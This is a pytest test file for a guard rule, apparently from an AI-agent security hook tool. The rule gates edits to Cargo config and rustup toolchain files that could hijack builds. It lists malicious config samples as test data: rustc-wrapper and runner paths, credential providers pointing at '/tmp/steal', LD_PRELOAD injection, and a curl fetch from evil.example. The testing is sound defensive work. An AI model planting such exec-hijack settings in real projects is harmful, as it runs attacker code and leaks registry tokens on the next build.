"""Cargo / rustup toolchain exec-hijack protection guard
(`rule_cargo_exec_protect`).

THREAT MODEL: Cargo merges `.cargo/config.toml` from the working directory,
every ancestor, and `$CARGO_HOME`, and several keys name a program Cargo
itself execs on the next ordinary build: `build.rustc-wrapper`/`rustc`/
`rustdoc` (every `cargo build`/`check`/`test`, incl. rust-analyzer's own
automatic `cargo check` on folder open), `target.*.runner`/`linker`, link
rustflags, custom registry credential providers (handed the live token),
`doc.browser`, dangerous `[env]` entries, and `paths`/`[patch]`/`include`.
rustup's `[toolchain] path` points every `cargo`/`rustc` proxy at an
arbitrary directory. Default mode is `ask`.
"""
import json
import time

import pytest

from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.loader import load_policy
from aegis.policy import Action, Policy

EMPTY = Policy()
DENY = Policy(cargo_exec={"mode": "deny"})
RULE = "cargo-exec-protect"
CFG = ".cargo/config.toml"


def _shell(cmd, cwd=None):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd}, cwd=cwd)


def _write(path, content, cwd=None):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Write",
                      args={"file_path": path, "content": content}, cwd=cwd)


def _edit(path, old, new, cwd=None, replace_all=False):
    args = {"file_path": path, "old_string": old, "new_string": new}
    if replace_all:
        args["replace_all"] = True
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit", args=args, cwd=cwd)


def _multi(path, pairs, cwd=None):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="MultiEdit",
                      args={"file_path": path,
                            "edits": [{"old_string": o, "new_string": n} for o, n in pairs]},
                      cwd=cwd)


def _mcp_write(path, content):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__filesystem__write_file",
                      action=ActionClass.MCP,
                      args={"path": path, "content": [{"type": "text", "text": content}]})


def _gated(d):
    return d.action != Action.ALLOW and d.rule == RULE


@pytest.fixture(autouse=True)
def _clean_env(monkeypatch):
    for k in ("AEGIS_ALLOW_CARGO_EXEC", "AEGIS_AGENT_NAME", "AEGIS_ALLOW_PACKAGE_MANIFEST"):
        monkeypatch.delenv(k, raising=False)


# ---- Write: every exec-capable key class -------------------------------------

DANGEROUS = [
    '[build]\nrustc-wrapper = "/tmp/x.sh"\n',
    '[build]\nrustc = "/tmp/rustc"\n',
    '[build]\nrustc-workspace-wrapper = "./w.sh"\n',
    '[build]\nrustdoc = "./doc.sh"\n',
    'build.rustc-wrapper = "/tmp/x"\n',
    'build = { rustc-wrapper = "/tmp/x" }\n',
    '[build]\n"rustc-wrapper" = "/tmp/x"\n',
    '[build]\n"rustc\\u002dwrapper" = "/tmp/x"\n',
    '[build]\nrustflags = ["-C", "linker=/tmp/ld"]\n',
    '[build]\nrustflags = "-Clink-arg=-fuse-ld=/tmp/ld"\n',
    '[target.x86_64-unknown-linux-gnu]\nrunner = "/tmp/run.sh"\n',
    "[target.'cfg(unix)']\nrunner = ['sh', '-c', 'id']\n",
    '[target.x86_64-unknown-linux-gnu]\nlinker = "/tmp/ld"\n',
    '[host]\nlinker = "/tmp/ld"\n',
    '[registry]\ncredential-provider = "/tmp/steal"\n',
    '[registry]\ncredential-provider = "cargo:token-from-stdout /tmp/steal"\n',
    '[registry]\nglobal-credential-providers = ["cargo:token", "/tmp/steal"]\n',
    '[registries.corp]\nindex = "sparse+https://x/"\ncredential-provider = ["/tmp/s", "a"]\n',
    '[credential-alias]\nmy = ["/tmp/steal"]\n',
    '[env]\nCC = "/tmp/cc"\n',
    '[env]\nLD_PRELOAD = { value = "/tmp/x.so", force = true }\n',
    '[env]\nRUSTC_WRAPPER = "/tmp/x"\n',
    '[env]\nCARGO_TARGET_X86_64_UNKNOWN_LINUX_GNU_RUNNER = "/tmp/x"\n',
    '[doc]\nbrowser = "/tmp/x"\n',
    'paths = ["../evil-crate"]\n',
    '[patch.crates-io]\nserde = { path = "../evil" }\n',
    'include = ["/tmp/other.toml"]\n',
]


@pytest.mark.parametrize("content", DANGEROUS)
def test_write_dangerous_cargo_config_gated(content, tmp_path):
    d = evaluate(_write(str(tmp_path / CFG), content), EMPTY)
    assert _gated(d), content


SAFE = [
    '[profile.release]\nlto = true\n',
    '[build]\nrustc-wrapper = ""\n',
    '[build]\ntarget-dir = "target2"\njobs = 4\n',
    '[build]\nrustflags = ["-C", "target-cpu=native"]\n',
    '[registry]\ncredential-provider = "cargo:token"\n',
    '[registry]\nglobal-credential-providers = ["cargo:token", "cargo:libsecret"]\n',
    '[registries.corp]\ncredential-provider = ["cargo:wincred"]\n',
    '[env]\nMY_APP_MODE = "dev"\nOPENSSL_STATIC = "1"\n',
    '[alias]\nb = "build"\n',
    '[net]\nretry = 3\n',
    '# rustc-wrapper = "/tmp/x" (commented out)\n[term]\nverbose = true\n',
]


@pytest.mark.parametrize("content", SAFE)
def test_write_benign_cargo_config_allowed(content, tmp_path):
    d = evaluate(_write(str(tmp_path / CFG), content), EMPTY)
    assert d.rule != RULE, content


def test_legacy_config_name_and_home_config(tmp_path):
    c = '[build]\nrustc-wrapper = "/tmp/x"\n'
    assert _gated(evaluate(_write(str(tmp_path / ".cargo/config"), c), EMPTY))
    assert _gated(evaluate(_write("~/.cargo/config.toml", c), EMPTY))
    assert _gated(evaluate(_write("C:\\Users\\u\\.cargo\\config.toml", c), EMPTY))


def test_unrelated_config_toml_not_gated(tmp_path):
    c = '[build]\nrustc-wrapper = "/tmp/x"\n'
    assert evaluate(_write(str(tmp_path / "config.toml"), c), EMPTY).rule != RULE
    assert evaluate(_write(str(tmp_path / "cargo/config.toml"), c), EMPTY).rule != RULE


def test_bare_config_with_cargo_cwd(tmp_path):
    c = '[build]\nrustc-wrapper = "/tmp/x"\n'
    d = evaluate(_write("config.toml", c, cwd=str(tmp_path / ".cargo")), EMPTY)
    assert _gated(d)


def test_invalid_toml_falls_back_to_regex(tmp_path):
    d = evaluate(_write(str(tmp_path / CFG), '[build\nrustc-wrapper = "/tmp/x"\n'), EMPTY)
    assert _gated(d)


def test_mcp_nested_write_gated(tmp_path):
    d = evaluate(_mcp_write(str(tmp_path / CFG), '[build]\nrustc-wrapper = "/x"\n'), EMPTY)
    assert _gated(d)


# ---- diff against disk ------------------------------------------------------

def test_existing_wrapper_unrelated_edit_allowed(tmp_path):
    p = tmp_path / CFG
    p.parent.mkdir()
    p.write_text('[build]\nrustc-wrapper = "sccache"\n\n[profile.dev]\nopt-level = 0\n')
    d = evaluate(_edit(str(p), "opt-level = 0", "opt-level = 1"), EMPTY)
    assert d.rule != RULE


def test_existing_wrapper_full_rewrite_keeping_it_allowed(tmp_path):
    p = tmp_path / CFG
    p.parent.mkdir()
    p.write_text('[build]\nrustc-wrapper = "sccache"\n')
    d = evaluate(_write(str(p), '[build]\nrustc-wrapper = "sccache"\njobs = 2\n'), EMPTY)
    assert d.rule != RULE


def test_value_only_edit_gated(tmp_path):
    p = tmp_path / CFG
    p.parent.mkdir()
    p.write_text('[build]\nrustc-wrapper = "sccache"\n')
    d = evaluate(_edit(str(p), '"sccache"', '"/tmp/evil"'), EMPTY)
    assert _gated(d)


def test_value_only_edit_relative_path_with_cwd(tmp_path):
    p = tmp_path / CFG
    p.parent.mkdir()
    p.write_text('[target.x86_64-unknown-linux-gnu]\nrunner = "valgrind"\n')
    d = evaluate(_edit(CFG, "valgrind", "/tmp/evil", cwd=str(tmp_path)), EMPTY)
    assert _gated(d)


def test_key_rename_edit_gated(tmp_path):
    p = tmp_path / CFG
    p.parent.mkdir()
    p.write_text('[build]\nzz = "/tmp/evil"\n')
    d = evaluate(_edit(str(p), "zz", "rustc-wrapper"), EMPTY)
    assert _gated(d)


def test_multiedit_replay(tmp_path):
    p = tmp_path / CFG
    p.parent.mkdir()
    p.write_text('[build]\njobs = 1\n')
    d = evaluate(_multi(str(p), [("jobs = 1", "jobs = 2"),
                                  ("jobs = 2", 'jobs = 2\nrustc = "/x"')]), EMPTY)
    assert _gated(d)


def test_value_only_edit_unreadable_file_falls_back(tmp_path):
    # File not on disk and old_string can't be replayed: old_string carries
    # the key, so the fallback still asks.
    d = evaluate(_edit(str(tmp_path / "nope" / CFG), 'rustc-wrapper = "sccache"',
                       'rustc-wrapper = "/tmp/evil"'), EMPTY)
    assert _gated(d)


def test_value_only_edit_old_without_key_unreadable_documented_gap(tmp_path):
    # Disclosed: with no readable file and no key on either side, there is
    # nothing to judge. (The Edit tool itself would fail on a missing file.)
    d = evaluate(_edit(str(tmp_path / "nope" / CFG), '"sccache"', '"/tmp/evil"'), EMPTY)
    assert d.rule != RULE


def test_removing_wrapper_allowed(tmp_path):
    p = tmp_path / CFG
    p.parent.mkdir()
    p.write_text('[build]\nrustc-wrapper = "sccache"\n')
    d = evaluate(_edit(str(p), 'rustc-wrapper = "sccache"\n', ""), EMPTY)
    assert d.rule != RULE


def test_disk_symlink_to_device_not_read(tmp_path):
    p = tmp_path / CFG
    p.parent.mkdir()
    p.symlink_to("/dev/zero")
    t = time.time()
    d = evaluate(_edit(str(p), "a", 'rustc = "/x"'), EMPTY)
    assert time.time() - t < 2 and _gated(d)


# ---- rustup -------------------------------------------------------------------

def test_toolchain_path_gated(tmp_path):
    for name in ("rust-toolchain.toml", "rust-toolchain"):
        d = evaluate(_write(str(tmp_path / name), '[toolchain]\npath = "/tmp/tc"\n'), EMPTY)
        assert _gated(d), name


def test_toolchain_channel_allowed(tmp_path):
    d = evaluate(_write(str(tmp_path / "rust-toolchain.toml"),
                        '[toolchain]\nchannel = "1.80"\ncomponents = ["clippy"]\n'), EMPTY)
    assert d.rule != RULE
    d = evaluate(_write(str(tmp_path / "rust-toolchain"), "stable\n"), EMPTY)
    assert d.rule != RULE


def test_rustup_state_write_gated():
    assert _gated(evaluate(_write("/home/u/.rustup/settings.toml", "x"), EMPTY))
    assert _gated(evaluate(_write("/home/u/.rustup/toolchains/stable/bin/rustc", "x"), EMPTY))


def test_rustup_toolchain_link_gated():
    assert _gated(evaluate(_shell("rustup toolchain link evil /tmp/tc"), EMPTY))
    assert evaluate(_shell("rustup toolchain list"), EMPTY).rule != RULE


# ---- shell --------------------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "echo '[build]' >> .cargo/config.toml",
    "printf '[build]\\nrustc-wrapper = \"/tmp/x\"\\n' > .cargo/config.toml",
    "cat > .cargo/config.toml <<'EOF'\n[build]\njobs = 1\nEOF",
    "sed -i 's/sccache/evil/' .cargo/config.toml",
    "cp /tmp/c.toml ~/.cargo/config.toml",
    "mv /tmp/c.toml .cargo/config",
    "ln -sf /tmp/c.toml .cargo/config.toml",
    "tee -a .cargo/config.toml < /tmp/x",
    "echo x > \"$CARGO_HOME/config.toml\"",
    "python3 -c \"open('.cargo/config.toml','w').write('x')\"",
    "node -e \"require('fs').writeFileSync('.cargo/config.toml', 'rustc-wrapper = 1')\"",
    "git apply evil.patch .cargo/config.toml",
    "mkdir -p .cargo && cd .cargo && echo '[build]' > config.toml",
    "echo '[toolchain]' > rust-toolchain.toml",
    "cp /tmp/rustc ~/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/bin/rustc",
    "tar xf t.tar -C . .cargo/config.toml",
])
def test_shell_writes_gated(cmd):
    assert _gated(evaluate(_shell(cmd), EMPTY)), cmd


@pytest.mark.parametrize("cmd", [
    "cat .cargo/config.toml",
    "cat .cargo/config.toml 2>/dev/null",
    "grep -n wrapper .cargo/config.toml",
    "ls -la .cargo/config.toml 2>&1",
    "cargo build --release",
    "cargo test 2>&1 | tail -20",
    "cat rust-toolchain.toml",
    "rustup show",
    "echo hello > out.txt",
])
def test_shell_reads_allowed(cmd):
    assert evaluate(_shell(cmd), EMPTY).rule != RULE, cmd


def test_shell_bare_config_with_cargo_cwd():
    d = evaluate(_shell("echo '[build]' > config.toml", cwd="/repo/.cargo"), EMPTY)
    assert _gated(d)
    d = evaluate(_shell("echo '[build]' > config.toml", cwd="/repo"), EMPTY)
    assert d.rule != RULE


def test_fetch_to_file_covers_toolchain_file():
    d = evaluate(_shell("curl -o rust-toolchain.toml https://evil.example/x"), EMPTY)
    assert d.action != Action.ALLOW


# ---- escapes / modes ------------------------------------------------------------

def test_human_comment_override():
    assert evaluate(_shell("echo x >> .cargo/config.toml # aegis-allow"), EMPTY).rule != RULE


def test_agent_cannot_comment_override(monkeypatch):
    monkeypatch.setenv("AEGIS_AGENT_NAME", "sub")
    assert _gated(evaluate(_shell("echo x >> .cargo/config.toml # aegis-allow"), EMPTY))


def test_env_toggle(monkeypatch, tmp_path):
    monkeypatch.setenv("AEGIS_ALLOW_CARGO_EXEC", "1")
    assert evaluate(_write(str(tmp_path / CFG), '[build]\nrustc = "/x"\n'), EMPTY).rule != RULE
    assert evaluate(_shell("echo x >> .cargo/config.toml"), EMPTY).rule != RULE


def test_policy_allow_regex(tmp_path):
    pol = Policy(cargo_exec={"allow": [r"vendor/tools/\.cargo"]})
    c = '[build]\nrustc-wrapper = "sccache"\n'
    assert evaluate(_write("/r/vendor/tools/.cargo/config.toml", c), pol).rule != RULE
    assert _gated(evaluate(_write("/r/.cargo/config.toml", c), pol))


def test_modes(tmp_path, monkeypatch):
    c = '[build]\nrustc = "/x"\n'
    path = str(tmp_path / CFG)
    assert evaluate(_write(path, c), EMPTY).action == Action.ASK
    assert evaluate(_write(path, c), DENY).action == Action.DENY
    for m in ("off", False):
        assert evaluate(_write(path, c), Policy(cargo_exec={"mode": m})).rule != RULE
    audit = tmp_path / "audit.jsonl"
    monkeypatch.setenv("AEGIS_AUDIT", str(audit))
    d = evaluate(_write(path, c), Policy(cargo_exec={"mode": "monitor"}))
    assert d.rule != RULE
    rows = [json.loads(l) for l in audit.read_text().splitlines() if l.strip()]
    assert any(r.get("rule") == "cargo-exec-protect-monitor" for r in rows)


def test_policy_knob_loads_from_yaml(tmp_path):
    f = tmp_path / "p.yaml"
    f.write_text("cargo_exec:\n  mode: deny\n")
    pol = load_policy(f)
    assert pol.cargo_exec == {"mode": "deny"}
    assert evaluate(_write(str(tmp_path / CFG), '[build]\nrustc = "/x"\n'), pol).action == Action.DENY


# ---- perf ---------------------------------------------------------------------

def test_perf_large_inputs(tmp_path):
    big = "[build]\n" + "x = 1\n" * 50000 + "#" * 200000
    t = time.time()
    evaluate(_write(str(tmp_path / CFG), big), EMPTY)
    evaluate(_shell("echo '" + "-C " * 100000 + "' > .cargo/config.toml"), EMPTY)
    evaluate(_shell("cd " + ".cargo" * 50000), EMPTY)
    assert time.time() - t < 3.0


@pytest.mark.parametrize("content", DANGEROUS)
def test_regex_fallback_without_tomllib(content, tmp_path, monkeypatch):
    # Python 3.10 has no tomllib: the line-level regex must still catch every
    # dangerous shape (it may over-ask on some safe ones -- the safe direction).
    import aegis.rules as rules
    monkeypatch.setattr(rules, "_tomllib", None)
    assert _gated(evaluate(_write(str(tmp_path / CFG), content), EMPTY)), content


# ---- QA round 1 (design review): fail closed when the TOML can't be judged --

RUNNER_ML = '[target.thumbv7em-none-eabihf]\nrunner = [\n  "probe-rs", "run",\n]\n'


def test_qa1_three_step_unparseable_dance_gated(tmp_path):
    # Step 1 of the dance makes the file invalid TOML; with an exec key still
    # present that step itself must ask (fail closed), so the later
    # value-only element swap can never ride the regex fallback.
    p = tmp_path / CFG
    p.parent.mkdir()
    p.write_text(RUNNER_ML)
    d = evaluate(_edit(str(p), "]\n", "]\n=garbage\n"), EMPTY)
    assert _gated(d)
    p.write_text(RUNNER_ML + "=garbage\n")
    d = evaluate(_edit(str(p), '"probe-rs", "run",', '"/tmp/evil.sh",'), EMPTY)
    assert _gated(d)


def test_qa1_multiline_element_edit_without_tomllib_gated(tmp_path, monkeypatch):
    import aegis.rules as rules
    monkeypatch.setattr(rules, "_tomllib", None)
    p = tmp_path / CFG
    p.parent.mkdir()
    p.write_text(RUNNER_ML)
    assert _gated(evaluate(_edit(str(p), '"probe-rs", "run",', '"/tmp/evil.sh",'), EMPTY))
    p.write_text("[build]\nrustc-wrapper = '''\nsccache'''\n")
    assert _gated(evaluate(_edit(str(p), "sccache", "/tmp/evil"), EMPTY))


def test_qa1_multiline_element_edit_with_tomllib_gated(tmp_path):
    p = tmp_path / CFG
    p.parent.mkdir()
    p.write_text(RUNNER_ML)
    assert _gated(evaluate(_edit(str(p), '"probe-rs", "run",', '"/tmp/evil.sh",'), EMPTY))


def test_qa1_oversized_file_edit_fails_closed(tmp_path):
    p = tmp_path / CFG
    p.parent.mkdir()
    p.write_text("#" * (1 << 20) + '\n[build]\nrustc-wrapper = ""\n')
    assert _gated(evaluate(_edit(str(p), '""\n', '"/tmp/evil.sh"\n'), EMPTY))
    t = tmp_path / "rust-toolchain.toml"
    t.write_text("#" * (1 << 20) + '\n[toolchain]\npath = ""\n')
    assert _gated(evaluate(_edit(str(t), '""', '"/tmp/tc"'), EMPTY))


def test_qa1_fifo_config_edit_fails_closed(tmp_path):
    import os
    p = tmp_path / CFG
    p.parent.mkdir()
    os.mkfifo(p)
    assert _gated(evaluate(_edit(str(p), "a", "b"), EMPTY))


def test_qa1_unparseable_pre_parseable_post_counts_all(tmp_path):
    p = tmp_path / CFG
    p.parent.mkdir()
    p.write_text('[build\nrustc-wrapper = "sccache"\n')
    d = evaluate(_edit(str(p), "[build\n", "[build]\n"), EMPTY)
    assert _gated(d)
